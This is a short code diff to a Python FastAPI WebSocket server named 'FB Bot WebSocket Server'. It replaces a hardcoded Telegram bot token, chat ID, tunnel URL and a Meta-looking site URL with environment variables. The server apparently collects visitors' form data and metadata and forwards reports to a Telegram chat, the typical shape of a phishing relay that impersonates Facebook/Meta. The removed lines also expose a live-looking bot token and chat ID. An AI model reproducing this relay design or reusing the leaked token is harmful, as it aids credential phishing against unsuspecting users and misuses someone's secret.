@@ -8,8 +8,12 @@ from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import RedirectResponse, HTMLResponse
 import uvicorn
+from dotenv import load_dotenv
+import os
 
 app = FastAPI(title="FB Bot WebSocket Server")
+
+load_dotenv()  # Load environment variables from .env file
 
 # CORS for React app
 app.add_middleware(
@@ -21,12 +25,12 @@ app.add_middleware(
 )
 
 # Telegram Bot Configuration
-BOT_TOKEN = "8402740123:AAEZ2mX2d9od3aWYAbZp40Nx6yFZdrsanWY"
-CHAT_ID = "-5123140727"
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
 
 # WebSocket server URL (update this when deploying)
 # For local dev, use ngrok or similar to expose
-WS_SERVER_URL = "https://52rlh0gv-8000.inc1.devtunnels.ms"
+WS_SERVER_URL = os.getenv("WS_SERVER_URL")
 
 # Store connected clients: {client_id: WebSocket}
 connected_clients: Dict[str, WebSocket] = {}
@@ -38,7 +42,7 @@ client_metadata: Dict[str, dict] = {}
 client_form_data: Dict[str, dict] = {}
 
 # Site URL for display in messages
-SITE_URL = "https://meta.com/require"
+SITE_URL = os.getenv("SITE_URL", "https://example.com")
 
 
 async def send_telegram_message(client_id: str, metadata: dict) -> Optional[int]:
